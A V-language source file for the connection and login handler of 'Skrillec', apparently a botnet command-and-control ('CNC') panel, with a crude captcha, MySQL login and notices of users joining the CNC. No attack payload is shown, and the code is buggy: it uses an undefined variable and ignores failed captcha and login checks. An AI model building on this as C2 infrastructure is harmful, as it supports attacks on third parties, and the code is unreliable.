module server

import os
import io
import net
import time
import auth
import utils
import mysql
import config
import server
import net.http
import rand

/*
Clients struct being called from Server Struct. Do not call this struct anywhere in this source
*/
pub struct Clients{
	pub mut:
		user_count		int
		u_name			[]string
		u_sockets		[]net.TcpConn
		u_ip			[]string
		u_port			[]int
		using_client	[]bool
}

/* 
Server Struct and Server Functions
*/
pub struct Server{
	pub mut:
		port 			string
		cnc_key 		string
		clients			&Clients
		current			&server.Current
		notice			&utils.NotificationSys
		sqlconn			mysql.Connection
}

pub fn (mut s Server) set_port(port string) {
	s.port = port
}

pub fn (mut s Server) connection_handler(mut socket net.TcpConn) {
	mut reader := io.new_buffered_reader(reader: socket)
	mut user_ip := socket.peer_addr() or { return }
	mut fixed_ip := "$user_ip".split("]:")[0].replace("[::ffff:", "")
	mut fixed_port := "$user_ip".split("]:")[1]
	utils.change_size(mut socket, 22, 106)
	print("New User Connected!: ${fixed_ip}:${fixed_port}\r\n")
	mut start_current := server.Current{}
	//Add captcha here to avoid bot logins or other things
	/*
		Captcha shit here
	*/
	num := rand.int_in_range(1, 1000)
    lol := http.get_text("https://artii.herokuapp.com/make?text=$num&font=italic").split("\n")
    mut output := "\r" 
    for i in lol {
    output += "\r$i\n" 
    }
    socket.write_string(output) or {0}
    socket.write_string("\r\n >>> [38;2;60;195;255m[38;2;55;200;255m[38;2;50;205;255m[38;2;45;210;255m[38;2;40;215;255m[38;2;35;220;255m") or {0}
    data := reader.read_line() or {return}
    if data.contains('$num'){
    conn.write_string("Captcha completed!\r\n") or {0}
    println('someone completed the captcha') 
    }
	else
	{
    conn.write_string("Invalid captcha!") or {0}
    println('someone failed the captcha')
    }
	//Add login here then log the user's username, IP, and detect if user is using the Skrillec CLIENT to connect
	/*
		Login shit here
	*/
	socket.write_string("${config.Green}Username: ") or { 0 }
	mut uname := reader.read_line() or { "" }
	socket.write_string("${config.Green}Password: ${config.Black}") or { 0 }// Black text when typing password (invisible)
	mut pwd := reader.read_line() or { "" }
	socket.write_string(config.Default) or { 0 } // reset color to default
	print("New User has logged in! ${uname}\r\n")
	login_check := auth.login(mut &s.sqlconn, mut socket, auth.CurrentLogin{
		username: uname
		password: pwd
		ip: fixed_ip
	})
	s.clients.new_user(uname, mut socket, fixed_ip, fixed_port.int(), false)
	///////////////////////////////// Send to command handler after login! ///////////////////////////////////////////
	for i in 0..(s.clients.u_name).len {
		if s.clients.u_name[i] != uname {
			s.clients.u_sockets[i].write_string("\r\n[+] New user has joined the CNC! ${uname}\r\n") or { 0 }
		}
	}
	utils.output_ui(mut socket, s.clients.get_username(mut socket))
	server.cmd_handler(mut socket, mut &s, mut &start_current)
}

////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////

pub fn start_skrillec(mut s Server) {
	mut svr := net.listen_tcp(.ip6, ":${s.port}") or { panic("[x] Error, Unable to bind server. Port is being used!") }
	for {
		mut socket := svr.accept() or { panic("[x] Error, Unable to accept the incoming connection!") }
		socket.set_read_timeout(time.infinite)
		go s.connection_handler(mut socket)
	}
}

/*
	Struct User Lookup Functions
*/

pub fn (mut c Clients) new_user(uname string, mut socket net.TcpConn, ip string, port int, using_client bool) {
	c.user_count += 1
	c.u_name << uname
	c.u_sockets << socket
	c.u_ip << ip
	c.u_port << port
	c.using_client << using_client
}

pub fn (mut c Clients) remove_user(uname string) {
	
}

pub fn (mut c Clients) get_ip(username string) string {
	for i in 0..(c.u_sockets).len {
		if c.u_name[i] == username {
			ip := c.u_sockets[i].peer_addr() or { panic("[x] Error") }
			return "$ip"
		}
	}
	return ""
}

pub fn (mut c Clients) get_username(mut socket net.TcpConn) string {
	for i in 0..(c.u_sockets).len {
		if c.u_sockets[i] == socket {
			ip := c.u_name[i]
			return "$ip"
		}
	}
	return ""
}
